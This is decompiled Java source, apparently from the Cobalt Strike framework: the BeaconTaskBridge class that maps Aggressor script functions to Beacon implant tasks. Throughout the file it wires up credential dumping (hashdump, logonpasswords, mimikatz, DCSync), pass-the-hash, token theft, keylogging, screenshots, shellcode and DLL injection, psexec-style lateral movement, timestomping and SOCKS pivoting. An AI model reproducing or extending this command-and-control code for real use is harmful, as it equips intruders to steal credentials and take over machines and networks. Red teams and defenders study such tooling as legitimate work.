package aggressor.bridges;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.Registry;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.ListenerUtils;
import common.ScListener;
import cortana.Cortana;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.Stack;
import sleep.bridges.BridgeUtilities;
import sleep.interfaces.Function;
import sleep.interfaces.Loadable;
import sleep.runtime.Scalar;
import sleep.runtime.ScriptInstance;
import sleep.runtime.SleepUtils;

public class BeaconTaskBridge implements Function, Loadable {
   protected AggressorClient client;

   public BeaconTaskBridge(AggressorClient var1) {
      this.client = var1;
   }

   public void scriptLoaded(ScriptInstance var1) {
      LinkedList var2 = new LinkedList();
      var2.add("&binput");
      var2.add("&berror");
      var2.add("&btask");
      var2.add("&blog");
      var2.add("&blog2");
      var2.add("&beacon_link");
      var2.add("&bargue_add");
      var2.add("&bargue_list");
      var2.add("&bargue_remove");
      var2.add("&bblockdlls");
      var2.add("&bbrowserpivot");
      var2.add("&bbrowserpivot_stop");
      var2.add("&bbypassuac");
      var2.add("&bcancel");
      var2.add("&bcd");
      var2.add("&bcheckin");
      var2.add("&bclear");
      var2.add("&bconnect");
      var2.add("&bcovertvpn");
      var2.add("&bcp");
      var2.add("&bdcsync");
      var2.add("&bdesktop");
      var2.add("&bdllinject");
      var2.add("&bdllload");
      var2.add("&bdllspawn");
      var2.add("&bdownload");
      var2.add("&bdrives");
      var2.add("&belevate");
      var2.add("&belevate_command");
      var2.add("&bexecute");
      var2.add("&bexecute_assembly");
      var2.add("&bexit");
      var2.add("&bgetprivs");
      var2.add("&bgetsystem");
      var2.add("&bgetuid");
      var2.add("&bhashdump");
      var2.add("&binject");
      var2.add("&binline_execute");
      var2.add("&bjobkill");
      var2.add("&bjobs");
      var2.add("&bjump");
      var2.add("&bkerberos_ccache_use");
      var2.add("&bkerberos_ticket_purge");
      var2.add("&bkerberos_ticket_use");
      var2.add("&bkeylogger");
      var2.add("&bkill");
      var2.add("&blink");
      var2.add("&bloginuser");
      var2.add("&blogonpasswords");
      var2.add("&bmkdir");
      var2.add("&bmimikatz");
      var2.add("&bmimikatz_small");
      var2.add("&bmode");
      var2.add("&bmv");
      var2.add("&bnetview");
      var2.add("&bnet");
      var2.add("&bnote");
      var2.add("&bpassthehash");
      var2.add("&bpause");
      var2.add("&bportscan");
      var2.add("&bpowerpick");
      var2.add("&bpowershell");
      var2.add("&bpowershell_import");
      var2.add("&bpowershell_import_clear");
      var2.add("&bppid");
      var2.add("&bprintscreen");
      var2.add("&bpsexec");
      var2.add("&bpsexec_command");
      var2.add("&bpsexec_psh");
      var2.add("&bpsinject");
      var2.add("&bpwd");
      var2.add("&breg_query");
      var2.add("&breg_queryv");
      var2.add("&bremote_exec");
      var2.add("&brev2self");
      var2.add("&brportfwd");
      var2.add("&brportfwd_local");
      var2.add("&bspunnel");
      var2.add("&bspunnel_local");
      var2.add("&btcppivot");
      var2.add("&brportfwd_stop");
      var2.add("&brm");
      var2.add("&brun");
      var2.add("&brunas");
      var2.add("&brunasadmin");
      var2.add("&brunu");
      var2.add("&bsetenv");
      var2.add("&bscreenshot");
      var2.add("&bscreenwatch");
      var2.add("&bshell");
      var2.add("&bshinject");
      var2.add("&bshspawn");
      var2.add("&bsleep");
      var2.add("&bsocks");
      var2.add("&bsocks_stop");
      var2.add("&bspawn");
      var2.add("&bspawnas");
      var2.add("&bspawnto");
      var2.add("&bspawnu");
      var2.add("&bssh");
      var2.add("&bssh_key");
      var2.add("&bstage");
      var2.add("&bsteal_token");
      var2.add("&bsudo");
      var2.add("&btimestomp");
      var2.add("&bunlink");
      var2.add("&bupload");
      var2.add("&bupload_raw");
      var2.add("&bwdigest");
      var2.add("&bwinrm");
      var2.add("&bwmi");
      Iterator var3 = var2.iterator();

      while(var3.hasNext()) {
         String var4 = (String)var3.next();
         Cortana.put(var1, var4, this);
         Cortana.put(var1, var4 + "!", this);
      }

   }

   public void scriptUnloaded(ScriptInstance var1) {
   }

   public static String[] bids(Stack var0) {
      return BeaconBridge.bids(var0);
   }

   private int A(Stack var1, StringBuffer var2, int var3, String var4) {
      Scalar var5 = BridgeUtilities.getScalar(var1);
      int var6 = var5.objectValue() == null ? var3 : var5.intValue();
      String var7 = BridgeUtilities.getString(var1, var4);
      boolean var8 = CommonUtils.contains("x86, x64", var7);
      if (var6 >= 0 && !var8) {
         throw new IllegalArgumentException("argument architecture is not valid set to x86 or x64");
      } else if (var6 < 0) {
         if (var8) {
            throw new IllegalArgumentException("argument pid is not valid");
         } else {
            throw new IllegalArgumentException("argument pid and architecture are not valid");
         }
      } else {
         var2.append(var7);
         return var6;
      }
   }

   public Scalar evaluate(String var1, ScriptInstance var2, Stack var3) {
      String[] var4 = bids(var3);
      TaskBeacon var5 = new TaskBeacon(this.client, var4);
      if (var1.endsWith("!")) {
         var1 = CommonUtils.stripRight(var1, "!");
         var5.silent();
      }

      String var6;
      String var7;
      if (var1.equals("&bargue_add")) {
         var6 = BridgeUtilities.getString(var3, "");
         var7 = BridgeUtilities.getString(var3, "");
         var5.SpoofArgsAdd(var6, var7);
      } else if (var1.equals("&bargue_list")) {
         var5.SpoofArgsList();
      } else if (var1.equals("&bargue_remove")) {
         var6 = BridgeUtilities.getString(var3, "");
         var5.SpoofArgsRemove(var6);
      } else if (var1.equals("&bblockdlls")) {
         Scalar var12 = BridgeUtilities.getScalar(var3);
         var5.BlockDLLs(SleepUtils.isTrueScalar(var12));
      } else {
         StringBuffer var13;
         int var14;
         if (var1.equals("&bbrowserpivot")) {
            var13 = new StringBuffer();
            var14 = this.A(var3, var13, -1, "x86");
            var5.BrowserPivot(var14, var13.toString());
         } else if (var1.equals("&bbrowserpivot_stop")) {
            var5.BrowserPivotStop();
         } else {
            if (var1.equals("&bbypassuac")) {
               throw new RuntimeException("Removed in Cobalt Strike 4.0");
            }

            if (var1.equals("&bcancel")) {
               var6 = BridgeUtilities.getString(var3, "");
               var5.Cancel(var6);
            } else if (var1.equals("&bclear")) {
               var5.Clear();
            } else if (var1.equals("&bcd")) {
               var6 = BridgeUtilities.getString(var3, "");
               var5.Cd(var6);
            } else if (var1.equals("&bcheckin")) {
               var5.Checkin();
            } else {
               int var8;
               int var9;
               String var15;
               if (var1.equals("&bcovertvpn")) {
                  var6 = BridgeUtilities.getString(var3, "");
                  var7 = BridgeUtilities.getString(var3, "");
                  if (var3.isEmpty()) {
                     for(var8 = 0; var8 < var4.length; ++var8) {
                        var5.CovertVPN(var4[var8], var6, var7, (String)null);
                     }
                  } else {
                     var15 = BridgeUtilities.getString(var3, "");

                     for(var9 = 0; var9 < var4.length; ++var9) {
                        var5.CovertVPN(var4[var9], var6, var7, var15);
                     }
                  }
               } else if (var1.equals("&bcp")) {
                  var6 = BridgeUtilities.getString(var3, "");
                  var7 = BridgeUtilities.getString(var3, "");
                  var5.Copy(var6, var7);
               } else if (var1.equals("&bdcsync")) {
                  var6 = BridgeUtilities.getString(var3, "");
                  if (var3.isEmpty()) {
                     var5.DcSync(var6, -1, (String)null);
                  } else {
                     var7 = BridgeUtilities.getString(var3, "");
                     if (var3.isEmpty()) {
                        if (CommonUtils.isNullOrEmpty(var7)) {
                           var5.DcSync(var6, -1, (String)null);
                        } else {
                           var5.DcSync(var6, var7, -1, (String)null);
                        }
                     } else {
                        StringBuffer var17 = new StringBuffer();
                        var9 = this.A(var3, var17, -1, (String)null);
                        if (CommonUtils.isNullOrEmpty(var7)) {
                           var5.DcSync(var6, var9, var17.toString());
                        } else {
                           var5.DcSync(var6, var7, var9, var17.toString());
                        }
                     }
                  }
               } else if (var1.equals("&bdesktop")) {
                  var5.Desktop(true);
               } else {
                  int var16;
                  if (var1.equals("&bdllinject")) {
                     var16 = BridgeUtilities.getInt(var3, 0);
                     var7 = BridgeUtilities.getString(var3, "");
                     var5.DllInject(var16, var7);
                  } else if (var1.equals("&bdllload")) {
                     var16 = BridgeUtilities.getInt(var3, 0);
                     var7 = BridgeUtilities.getString(var3, "");
                     var5.DllLoad(var16, var7);
                  } else if (var1.equals("&bdllspawn")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     var7 = BridgeUtilities.getString(var3, (String)null);
                     var15 = BridgeUtilities.getString(var3, (String)null);
                     var9 = BridgeUtilities.getInt(var3, 0);
                     boolean var10 = SleepUtils.isTrueScalar(BridgeUtilities.getScalar(var3));
                     var5.DllSpawn(var6, var7, var15, var9, var10);
                  } else if (var1.equals("&bdownload")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     var5.Download(var6);
                  } else if (var1.equals("&bdrives")) {
                     var5.Drives();
                  } else if (var1.equals("&belevate")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     var7 = BridgeUtilities.getString(var3, "");
                     var5.Elevate(var6, var7);
                  } else if (var1.equals("&belevate_command")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     var7 = BridgeUtilities.getString(var3, "");
                     var5.ElevateCommand(var6, var7);
                  } else if (var1.equals("&berror")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     var5.error(var6);
                  } else if (var1.equals("&bexecute")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     var5.Execute(var6);
                  } else if (var1.equals("&bexecute_assembly")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     var7 = BridgeUtilities.getString(var3, "");
                     var5.ExecuteAssembly(var6, var7);
                  } else if (var1.equals("&bexit")) {
                     var5.Die();
                  } else if (var1.equals("&bgetuid")) {
                     var5.GetUID();
                  } else if (var1.equals("&bhashdump")) {
                     if (var3.isEmpty()) {
                        var5.Hashdump();
                     } else {
                        var13 = new StringBuffer();
                        var14 = this.A(var3, var13, -1, (String)null);
                        var5.Hashdump(var14, var13.toString());
                     }
                  } else if (var1.equals("&binject")) {
                     var16 = BridgeUtilities.getInt(var3, 0);
                     var7 = BridgeUtilities.getString(var3, "");
                     var15 = BridgeUtilities.getString(var3, "x86");
                     var5.Inject(var16, var7, var15);
                  } else if (var1.equals("&binline_execute")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     var7 = BridgeUtilities.getString(var3, "");
                     var5.InlineExecuteObject(var6, var7);
                  } else if (var1.equals("&binput")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     var5.input(var6);
                  } else if (var1.equals("&bgetprivs")) {
                     if (var3.isEmpty()) {
                        var5.GetPrivs();
                     } else {
                        var6 = BridgeUtilities.getString(var3, "");
                        var5.GetPrivs(var6);
                     }
                  } else if (var1.equals("&bgetsystem")) {
                     var5.GetSystem();
                  } else if (var1.equals("&bjobkill")) {
                     var16 = BridgeUtilities.getInt(var3, 0);
                     var5.JobKill(var16);
                  } else if (var1.equals("&bjobs")) {
                     var5.Jobs();
                  } else if (var1.equals("&bjump")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     var7 = BridgeUtilities.getString(var3, "");
                     var15 = BridgeUtilities.getString(var3, "");
                     var5.Jump(var6, var7, var15);
                  } else if (var1.equals("&bkerberos_ticket_purge")) {
                     var5.KerberosTicketPurge();
                  } else if (var1.equals("&bkerberos_ticket_use")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     var5.KerberosTicketUse(var6);
                  } else if (var1.equals("&bkerberos_ccache_use")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     var5.KerberosCCacheUse(var6);
                  } else if (var1.equals("&bkeylogger")) {
                     if (var3.isEmpty()) {
                        var5.KeyLogger();
                     } else {
                        var13 = new StringBuffer();
                        var14 = this.A(var3, var13, -1, "x86");
                        var5.KeyLogger(var14, var13.toString());
                     }
                  } else if (var1.equals("&bkill")) {
                     var16 = BridgeUtilities.getInt(var3, 0);
                     var5.Kill(var16);
                  } else if (var1.equals("&blink")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     var7 = "";
                     if (!var3.isEmpty()) {
                        var7 = BridgeUtilities.getString(var3, "");
                        var5.Link("\\\\" + var6 + "\\pipe\\" + var7);
                     } else {
                        var5.Link(DataUtils.getDefaultPipeName(this.client.getData(), var6));
                     }
                  } else if (var1.equals("&bconnect")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     if (!var3.isEmpty()) {
                        var14 = BridgeUtilities.getInt(var3, 0);
                        var5.Connect(var6, var14);
                     } else {
                        var5.Connect(var6);
                     }
                  } else if (var1.equals("&blog")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     var5.log(var6);
                  } else if (var1.equals("&blog2")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     var5.log2(var6);
                  } else if (var1.equals("&bloginuser")) {
                     var6 = BridgeUtilities.getString(var3, "");
                     var7 = BridgeUtilities.getString(var3, "");
                     var15 = BridgeUtilities.getString(var3, "");
                     var5.LoginUser(var6, var7, var15);
                  } else if (var1.equals("&blogonpasswords")) {
                     if (var3.isEmpty()) {
                        var5.LogonPasswords(-1, (String)null);
                     } else {
                        var13 = new StringBuffer();
                        var14 = this.A(var3, var13, -1, (String)null);
                        var5.LogonPasswords(var14, var13.toString());
                     }
                  } else {
                     StringBuffer var22;
                     if (var1.equals("&bmimikatz")) {
                        var6 = BridgeUtilities.getString(var3, "");
                        if (var3.isEmpty()) {
                           var5.Mimikatz(var6, -1, (String)null);
                        } else {
                           var22 = new StringBuffer();
                           var8 = this.A(var3, var22, -1, (String)null);
                           var5.Mimikatz(var6, var8, var22.toString());
                        }
                     } else if (var1.equals("&bmimikatz_small")) {
                        var6 = BridgeUtilities.getString(var3, "");
                        if (var3.isEmpty()) {
                           var5.MimikatzSmall(var6, -1, (String)null);
                        } else {
                           var22 = new StringBuffer();
                           var8 = this.A(var3, var22, -1, (String)null);
                           var5.MimikatzSmall(var6, var8, var22.toString());
                        }
                     } else if (var1.equals("&bmkdir")) {
                        var6 = BridgeUtilities.getString(var3, "");
                        var5.MkDir(var6);
                     } else if (var1.equals("&bmode")) {
                        var6 = BridgeUtilities.getString(var3, "");
                        if ("dns".equals(var6)) {
                           var5.ModeDNS();
                        } else if ("dns6".equals(var6)) {
                           var5.ModeDNS6();
                        } else if ("dns-txt".equals(var6)) {
                           var5.ModeDNS_TXT();
                        } else {
                           if (!"http".equals(var6)) {
                              throw new RuntimeException("Invalid mode: '" + var6 + "'");
                           }

                           var5.ModeHTTP();
                        }
                     } else if (var1.equals("&bmv")) {
                        var6 = BridgeUtilities.getString(var3, "");
                        var7 = BridgeUtilities.getString(var3, "");
                        var5.Move(var6, var7);
                     } else {
                        StringBuffer var18;
                        int var19;
                        if (var1.equals("&bnet")) {
                           var6 = BridgeUtilities.getString(var3, "");
                           var7 = BridgeUtilities.getString(var3, (String)null);
                           var15 = BridgeUtilities.getString(var3, (String)null);
                           var7 = CommonUtils.isNullOrEmpty(var7) ? null : var7;
                           var15 = CommonUtils.isNullOrEmpty(var15) ? null : var15;
                           if (var3.isEmpty()) {
                              var5.NetView(var6, var7, var15, -1, (String)null);
                           } else {
                              var18 = new StringBuffer();
                              var19 = this.A(var3, var18, -1, (String)null);
                              var5.NetView(var6, var7, var15, var19, var18.toString());
                           }
                        } else {
                           if (var1.equals("&bnetview")) {
                              throw new RuntimeException("This function is deprecated, use the bnet function wih the view command.");
                           }

                           if (var1.equals("&bnote")) {
                              var6 = BridgeUtilities.getString(var3, "");
                              var5.Note(var6);
                           } else if (var1.equals("&bpassthehash")) {
                              var6 = BridgeUtilities.getString(var3, "");
                              var7 = BridgeUtilities.getString(var3, "");
                              var15 = BridgeUtilities.getString(var3, "");
                              if (var3.isEmpty()) {
                                 var5.PassTheHash(var6, var7, var15, -1, (String)null);
                              } else {
                                 var18 = new StringBuffer();
                                 var19 = this.A(var3, var18, -1, (String)null);
                                 var5.PassTheHash(var6, var7, var15, var19, var18.toString());
                              }
                           } else if (var1.equals("&bpause")) {
                              var16 = BridgeUtilities.getInt(var3, 0);
                              var5.Pause(var16);
                           } else {
                              int var11;
                              StringBuffer var20;
                              if (var1.equals("&bportscan")) {
                                 var6 = BridgeUtilities.getString(var3, "");
                                 var7 = BridgeUtilities.getString(var3, "1-1024");
                                 var15 = BridgeUtilities.getString(var3, "arp");
                                 var9 = BridgeUtilities.getInt(var3, 1024);
                                 if (var3.isEmpty()) {
                                    var5.PortScan(var6, var7, var15, var9, -1, (String)null);
                                 } else {
                                    var20 = new StringBuffer();
                                    var11 = this.A(var3, var20, -1, (String)null);
                                    var5.PortScan(var6, var7, var15, var9, var11, var20.toString());
                                 }
                              } else if (var1.equals("&bpowerpick")) {
                                 var6 = BridgeUtilities.getString(var3, "");
                                 if (var3.isEmpty()) {
                                    var5.PowerShellUnmanaged(var6);
                                 } else {
                                    var7 = BridgeUtilities.getString(var3, "");
                                    if ("".equals(var7)) {
                                       var5.PowerShellUnmanaged(var6, "");
                                    } else {
                                       var5.PowerShellUnmanaged(var6, var7 + "; ");
                                    }
                                 }
                              } else if (var1.equals("&bpowershell")) {
                                 var6 = BridgeUtilities.getString(var3, "");
                                 if (var3.isEmpty()) {
                                    var5.PowerShell(var6);
                                 } else {
                                    var7 = BridgeUtilities.getString(var3, "");
                                    if ("".equals(var7)) {
                                       var5.PowerShellWithCradle(var6, "");
                                    } else {
                                       var5.PowerShellWithCradle(var6, var7 + "; ");
                                    }
                                 }
                              } else if (var1.equals("&bpowershell_import")) {
                                 var6 = BridgeUtilities.getString(var3, "");
                                 var5.PowerShellImport(var6);
                              } else if (var1.equals("&bpowershell_import_clear")) {
                                 var5.PowerShellImportClear();
                              } else if (var1.equals("&bppid")) {
                                 var16 = BridgeUtilities.getInt(var3, 0);
                                 var5.PPID(var16);
                              } else {
                                 String var21;
                                 if (var1.equals("&bpsexec")) {
                                    var6 = BridgeUtilities.getString(var3, "");
                                    var7 = BridgeUtilities.getString(var3, "");
                                    var15 = BridgeUtilities.getString(var3, "ADMIN$");
                                    var21 = BridgeUtilities.getString(var3, "x86");
                                    var5.PsExec(var6, var7, var15, var21);
                                 } else if (var1.equals("&bpsexec_command")) {
                                    var6 = BridgeUtilities.getString(var3, "");
                                    var7 = BridgeUtilities.getString(var3, "");
                                    var15 = BridgeUtilities.getString(var3, "");
                                    var5.PsExecCommand(var6, var7, var15);
                                 } else {
                                    if (var1.equals("&bpsexec_psh")) {
                                       throw new RuntimeException("Removed in Cobalt Strike 4.0");
                                    }

                                    if (var1.equals("&bpsinject")) {
                                       var13 = new StringBuffer();
                                       var14 = this.A(var3, var13, -1, (String)null);
                                       var15 = BridgeUtilities.getString(var3, "");
                                       if (CommonUtils.isNullOrEmpty(var15)) {
                                          throw new IllegalArgumentException("argument command is missing");
                                       }

                                       var5.PsInject(var14, var13.toString(), var15);
                                    } else if (var1.equals("&bpwd")) {
                                       var5.Pwd();
                                    } else if (var1.equals("&breg_query")) {
                                       var6 = BridgeUtilities.getString(var3, "");
                                       var7 = BridgeUtilities.getString(var3, "x86");
                                       var5.RegQuery(new Registry(var7, var6, false));
                                    } else if (var1.equals("&breg_queryv")) {
                                       var6 = BridgeUtilities.getString(var3, "");
                                       var7 = BridgeUtilities.getString(var3, "");
                                       var15 = BridgeUtilities.getString(var3, "x86");
                                       var5.RegQueryValue(new Registry(var15, var6 + " " + var7, true));
                                    } else if (var1.equals("&bremote_exec")) {
                                       var6 = BridgeUtilities.getString(var3, "");
                                       var7 = BridgeUtilities.getString(var3, "");
                                       var15 = BridgeUtilities.getString(var3, "");
                                       var5.RemoteExecute(var6, var7, var15);
                                    } else if (var1.equals("&brev2self")) {
                                       var5.Rev2Self();
                                    } else if (var1.equals("&brm")) {
                                       var6 = BridgeUtilities.getString(var3, "");
                                       if ("".equals(var6)) {
                                          throw new IllegalArgumentException("argument is empty (you don't want this)");
                                       }

                                       var5.Rm(var6);
                                    } else if (var1.equals("&btcppivot")) {
                                       var16 = BridgeUtilities.getInt(var3, 0);
                                       var5.PivotListenerTCP(var16);
                                    } else if (var1.equals("&brportfwd")) {
                                       var16 = BridgeUtilities.getInt(var3, 0);
                                       var7 = BridgeUtilities.getString(var3, "");
                                       var8 = BridgeUtilities.getInt(var3, 0);
                                       var5.PortForward(var16, var7, var8);
                                    } else if (var1.equals("&brportfwd_local")) {
                                       var16 = BridgeUtilities.getInt(var3, 0);
                                       var7 = BridgeUtilities.getString(var3, "");
                                       var8 = BridgeUtilities.getInt(var3, 0);
                                       var5.PortForwardLocal(var16, var7, var8);
                                    } else if (var1.equals("&bspunnel")) {
                                       var6 = BridgeUtilities.getString(var3, "x86");
                                       var7 = BridgeUtilities.getString(var3, "");
                                       var8 = BridgeUtilities.getInt(var3, 0);
                                       var21 = BridgeUtilities.getString(var3, "");
                                       var5.SpawnAndTunnel(var6, var7, var8, var21, false);
                                    } else if (var1.equals("&bspunnel_local")) {
                                       var6 = BridgeUtilities.getString(var3, "x86");
                                       var7 = BridgeUtilities.getString(var3, "");
                                       var8 = BridgeUtilities.getInt(var3, 0);
                                       var21 = BridgeUtilities.getString(var3, "");
                                       var5.SpawnAndTunnel(var6, var7, var8, var21, true);
                                    } else if (var1.equals("&brportfwd_stop")) {
                                       var16 = BridgeUtilities.getInt(var3, 0);
                                       var5.PortForwardStop(var16);
                                    } else if (var1.equals("&brun")) {
                                       var6 = BridgeUtilities.getString(var3, "");
                                       var5.Run(var6);
                                    } else if (var1.equals("&brunas")) {
                                       var6 = BridgeUtilities.getString(var3, "");
                                       var7 = BridgeUtilities.getString(var3, "");
                                       var15 = BridgeUtilities.getString(var3, "");
                                       var21 = BridgeUtilities.getString(var3, "");
                                       var5.RunAs(var6, var7, var15, var21);
                                    } else {
                                       if (var1.equals("&brunasadmin")) {
                                          throw new RuntimeException("Removed in Cobalt Strike 4.0");
                                       }

                                       if (var1.equals("&brunu")) {
                                          var16 = BridgeUtilities.getInt(var3, 0);
                                          var7 = BridgeUtilities.getString(var3, "");
                                          var5.RunUnder(var16, var7);
                                       } else if (var1.equals("&bprintscreen")) {
                                          if (var3.isEmpty()) {
                                             var5.Printscreen();
                                          } else {
                                             var13 = new StringBuffer();
                                             var14 = this.A(var3, var13, -1, "x86");
                                             var5.Printscreen(var14, var13.toString());
                                          }
                                       } else if (var1.equals("&bscreenshot")) {
                                          if (var3.isEmpty()) {
                                             var5.Screenshot();
                                          } else {
                                             var13 = new StringBuffer();
                                             var14 = this.A(var3, var13, -1, "x86");
                                             var5.Screenshot(var14, var13.toString());
                                          }
                                       } else if (var1.equals("&bscreenwatch")) {
                                          if (var3.isEmpty()) {
                                             var5.Screenwatch();
                                          } else {
                                             var13 = new StringBuffer();
                                             var14 = this.A(var3, var13, -1, "x86");
                                             var5.Screenwatch(var14, var13.toString());
                                          }
                                       } else if (var1.equals("&bsetenv")) {
                                          var6 = BridgeUtilities.getString(var3, "");
                                          if (!var3.isEmpty()) {
                                             var7 = BridgeUtilities.getString(var3, "");
                                             var5.SetEnv(var6, var7);
                                          } else {
                                             var5.SetEnv(var6, (String)null);
                                          }
                                       } else if (var1.equals("&bshell")) {
                                          var6 = BridgeUtilities.getString(var3, "");
                                          var5.Shell(var6);
                                       } else if (var1.equals("&bshinject")) {
                                          var13 = new StringBuffer();
                                          var14 = this.A(var3, var13, -1, (String)null);
                                          var15 = BridgeUtilities.getString(var3, "");
                                          if (CommonUtils.isNullOrEmpty(var15)) {
                                             throw new IllegalArgumentException("argument file is missing");
                                          }

                                          var5.ShellcodeInject(var14, var13.toString(), var15);
                                       } else if (var1.equals("&bshspawn")) {
                                          var6 = BridgeUtilities.getString(var3, "x86");
                                          var7 = BridgeUtilities.getString(var3, "");
                                          var5.ShellcodeSpawn(var6, var7);
                                       } else if (var1.equals("&bsleep")) {
                                          var16 = BridgeUtilities.getInt(var3, 0);
                                          var14 = BridgeUtilities.getInt(var3, 0);
                                          var5.Sleep(var16, var14);
                                       } else if (var1.equals("&bsocks")) {
                                          var16 = BridgeUtilities.getInt(var3, 0);
                                          var5.SocksStart(var16);
                                       } else if (var1.equals("&bsocks_stop")) {
                                          var5.SocksStop();
                                       } else if (var1.equals("&bspawn")) {
                                          var6 = BridgeUtilities.getString(var3, "");
                                          if (var3.isEmpty()) {
                                             var5.Spawn(var6);
                                          } else {
                                             var7 = BridgeUtilities.getString(var3, "x86");
                                             var5.Spawn(var6, var7);
                                          }
                                       } else if (var1.equals("&bspawnas")) {
                                          var6 = BridgeUtilities.getString(var3, "");
                                          var7 = BridgeUtilities.getString(var3, "");
                                          var15 = BridgeUtilities.getString(var3, "");
                                          var21 = BridgeUtilities.getString(var3, "");
                                          var5.SpawnAs(var6, var7, var15, var21);
                                       } else if (var1.equals("&bspawnto")) {
                                          if (var3.isEmpty()) {
                                             var5.SpawnTo();
                                          } else {
                                             var6 = BridgeUtilities.getString(var3, "x86");
                                             var7 = BridgeUtilities.getString(var3, "");
                                             var5.SpawnTo(var6, var7);
                                          }
                                       } else if (var1.equals("&bspawnu")) {
                                          var16 = BridgeUtilities.getInt(var3, 0);
                                          var7 = BridgeUtilities.getString(var3, "");
                                          var5.SpawnUnder(var16, var7);
                                       } else if (var1.equals("&bssh")) {
                                          var6 = BridgeUtilities.getString(var3, "");
                                          var14 = BridgeUtilities.getInt(var3, 22);
                                          var15 = BridgeUtilities.getString(var3, "");
                                          var21 = BridgeUtilities.getString(var3, "");
                                          if (var3.isEmpty()) {
                                             var5.SecureShell(var15, var21, var6, var14, -1, (String)null);
                                          } else {
                                             var20 = new StringBuffer();
                                             var11 = this.A(var3, var20, -1, (String)null);
                                             var5.SecureShell(var15, var21, var6, var14, var11, var20.toString());
                                          }
                                       } else if (var1.equals("&bssh_key")) {
                                          var6 = BridgeUtilities.getString(var3, "");
                                          var14 = BridgeUtilities.getInt(var3, 22);
                                          var15 = BridgeUtilities.getString(var3, "");
                                          var21 = BridgeUtilities.getString(var3, "");
                                          if (var3.isEmpty()) {
                                             var5.SecureShellPubKey(var15, CommonUtils.toBytes(var21), var6, var14, -1, (String)null);
                                          } else {
                                             var20 = new StringBuffer();
                                             var11 = this.A(var3, var20, -1, (String)null);
                                             var5.SecureShellPubKey(var15, CommonUtils.toBytes(var21), var6, var14, var11, var20.toString());
                                          }
                                       } else {
                                          if (var1.equals("&bstage")) {
                                             throw new RuntimeException("This function is deprecated in Cobalt Strike 4.0");
                                          }

                                          if (var1.equals("&bsteal_token")) {
                                             var16 = BridgeUtilities.getInt(var3, 0);
                                             var5.StealToken(var16);
                                          } else if (var1.equals("&bsudo")) {
                                             var6 = BridgeUtilities.getString(var3, "");
                                             var7 = BridgeUtilities.getString(var3, "");
                                             var5.ShellSudo(var6, var7);
                                          } else if (var1.equals("&btask")) {
                                             var6 = BridgeUtilities.getString(var3, "");
                                             var7 = BridgeUtilities.getString(var3, "");
                                             var5.task(var6, var7);
                                          } else if (var1.equals("&btimestomp")) {
                                             var6 = BridgeUtilities.getString(var3, "");
                                             var7 = BridgeUtilities.getString(var3, "");
                                             var5.TimeStomp(var6, var7);
                                          } else if (var1.equals("&bunlink")) {
                                             var6 = BridgeUtilities.getString(var3, "");
                                             if (var3.isEmpty()) {
                                                var5.Unlink(var6);
                                             } else {
                                                var7 = BridgeUtilities.getString(var3, "");
                                                var5.Unlink(var6, var7);
                                             }
                                          } else if (var1.equals("&bupload")) {
                                             var6 = BridgeUtilities.getString(var3, "");
                                             var5.Upload(var6);
                                          } else if (var1.equals("&bupload_raw")) {
                                             var6 = BridgeUtilities.getString(var3, "");
                                             var7 = BridgeUtilities.getString(var3, "");
                                             var15 = BridgeUtilities.getString(var3, var6);
                                             var5.UploadRaw(var15, var6, CommonUtils.toBytes(var7));
                                          } else {
                                             if (var1.equals("&bwdigest")) {
                                                throw new RuntimeException("Removed in Cobalt Strike 4.0");
                                             }

                                             if (var1.equals("&bwinrm")) {
                                                throw new RuntimeException("Removed in Cobalt Strike 4.0");
                                             }

                                             if (var1.equals("&bwmi")) {
                                                throw new RuntimeException("Removed in Cobalt Strike 4.0");
                                             }

                                             if (var1.equals("&beacon_link")) {
                                                var6 = BridgeUtilities.getString(var3, ".");
                                                var7 = BridgeUtilities.getString(var3, "");
                                                ScListener var23 = ListenerUtils.getListener(this.client, var7);
                                                if (var6 == null || "".equals(var6)) {
                                                   var6 = ".";
                                                }

                                                var5.linkToPayloadRemote(var23, var6);
                                             }
                                          }
                                       }
                                    }
                                 }
                              }
                           }
                        }
                     }
                  }
               }
            }
         }
      }

      return SleepUtils.getEmptyScalar();
   }
}
